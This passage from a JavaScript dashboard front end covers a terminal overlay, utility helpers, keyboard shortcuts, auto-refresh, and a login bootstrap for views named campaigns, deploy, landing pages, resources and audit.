                response.innerHTML = `<span class="prompt">[SYSTEM]</span> ${new Date().toISOString()}`;
                break;
            case 'whoami':
                response.innerHTML = `<span class="prompt">[SYSTEM]</span> Agent — authorized operator`;
                break;
            case 'echo':
                response.innerHTML = `<span class="prompt">[SYSTEM]</span> ${escHtml(parts.slice(1).join(' '))}`;
                break;
            default:
                response.innerHTML = `<span class="prompt">[SYSTEM]</span> Unknown command: ${escHtml(parts[0])}. Type 'help' for commands.`;
        }

        output.appendChild(response);
        output.scrollTop = output.scrollHeight;
    }

    // ─── Utility Functions ───────────────────────────────────────────
    function escHtml(str) {
        if (!str) return '';
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    }

    function formatDate(dateStr) {
        if (!dateStr) return '-';
        try {
            const d = new Date(dateStr);
            return d.toLocaleDateString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
        } catch (e) {
            return dateStr;
        }
    }

    function formatBytes(bytes) {
        if (!bytes || bytes === 0) return '0 B';
        const units = ['B', 'KB', 'MB', 'GB'];
        let i = 0;
        let val = bytes;
        while (val >= 1024 && i < units.length - 1) { val /= 1024; i++; }
        return `${val.toFixed(1)} ${units[i]}`;
    }

    // ─── Keyboard Shortcuts ──────────────────────────────────────────
    function initKeyboardShortcuts() {
        document.addEventListener('keydown', (e) => {
            // Don't trigger if typing in an input
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') return;

            switch (e.key) {
                case '`':
                    e.preventDefault();
                    const terminal = $('#terminal-overlay');
                    if (terminal) {
                        terminal.classList.toggle('hidden');
                        if (!terminal.classList.contains('hidden')) {
                            setTimeout(() => $('#terminal-input').focus(), 100);
                        }
                    }
                    break;
                case 'd': navigateTo('dashboard'); break;
                case 'c': navigateTo('campaigns'); break;
                case 'p': navigateTo('deploy'); break;
                case 'l': navigateTo('landing'); break;
                case 'r': navigateTo('resources'); break;
                case 'a': navigateTo('audit'); break;
            }
        });
    }

    // ─── Auto Refresh ────────────────────────────────────────────────
    function startAutoRefresh() {
        if (state.refreshTimer) clearInterval(state.refreshTimer);
        state.refreshTimer = setInterval(() => {
            if (state.currentView === 'dashboard') loadDashboard();
        }, CONFIG.REFRESH_INTERVAL);
    }

    // ─── App Initialization ──────────────────────────────────────────
    function initApp() {
        // Navigation \]('.nav-item[data-view]').forEach(el => {
            el.addEventListener('click', (e) => {
                e.preventDefault();
                navigateTo(el.dataset.view);
            });
        });

        // Logout
        $('#logout-btn').addEventListener('click', (e) => {
            e.preventDefault();
            logout();
        });

        // Terminal close
        $('#terminal-close').addEventListener('click', () => {
            $('#terminal-overlay').classList.add('hidden');
        });

        // Start services
        connectWS();
        startAutoRefresh();
        initTerminal();
        initKeyboardShortcuts();

        // Load default view
        navigateTo('dashboard');
    }

    // ─── Bootstrap ───────────────────────────────────────────────────
    function bootstrap() {
        initMatrix();

        // Check for existing session
        if (state.token) {
            api.get('/api/auth/verify').then(result => {
                if (result && result.valid) {
                    showLoginScreen(false);
                    initApp();
                } else {
                    localStorage.removeItem('forsake_token');
                    state.token = null;
                    showLoginScreen(true);
                }
            }).catch(() => {
                showLoginScreen(true);
            });
        } else {
            showLoginScreen(true);
        }

        // Login form
        $('#login-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = $('#username').value.trim();
            const password = $('#password').value;
            if (username && password) {
                await login(username, password);
            }
        });
    }

    // ─── Expose to window for inline onclick ─────────────────────────
    window.app = {
        navigate: navigateTo,
        loadCampaigns,
        loadLandingPages,
        loadResources,
        loadAuditLog,
        deleteCampaign,
    };

    // ─── Start ───────────────────────────────────────────────────────
    document.addEventListener('DOMContentLoaded', bootstrap);
})();
